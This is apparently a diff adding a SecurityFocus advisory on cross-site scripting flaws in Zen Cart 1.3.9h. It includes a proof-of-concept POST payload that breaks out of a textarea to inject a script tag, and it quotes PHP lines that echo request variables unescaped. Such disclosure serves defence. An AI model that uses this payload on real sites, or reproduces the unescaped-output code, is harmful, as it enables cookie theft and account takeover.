@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/50787/info
+
+Zen Cart is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Zen Cart 1.3.9h is vulnerable; other versions may also be affected. 
+
+GET: https://www.example.com/index.php?main_page=gv_send&action=send
+POST: message=&lt;/textarea&gt;<script>alert("XSS");</script><textarea> 
+
+line 72: echo &#039;<br /><strong>TESTING INFO:</strong> Time page: <strong>&#039; . $_GET[&#039;main_page&#039;] . &#039;</strong> was loaded is: <strong>&#039; . date(&#039;H:i:s&#039;, time()) . &#039;</strong><br /><br />&#039;;
+...
+line 75: echo "GLOBALS[$main_page] and HTTP_GET_VARS[&#039;main_page&#039;] and _GET[&#039;main_page&#039;] = " . $GLOBALS[&#039;main_page&#039;] . &#039; - &#039; . $HTTP_GET_VARS[&#039;main_page&#039;] . &#039; - &#039; . $_GET[&#039;main_page&#039;] . &#039;<br /><br />&#039;;
+...
+line 76: echo "_SERVER[&#039;PHP_SELF&#039;] and _GET[&#039;PHP_SELF&#039;] and PHP_SELF and _SESSION[&#039;PHP_SELF&#039;] = " . $_SERVER[&#039;PHP_SELF&#039;] . &#039; - &#039; . $_GET[&#039;PHP_SELF&#039;] . &#039; - &#039; . $PHP_SELF . &#039; - &#039; . $_SESSION[&#039;PHP_SELF&#039;] . &#039;<br /><br />&#039;; 
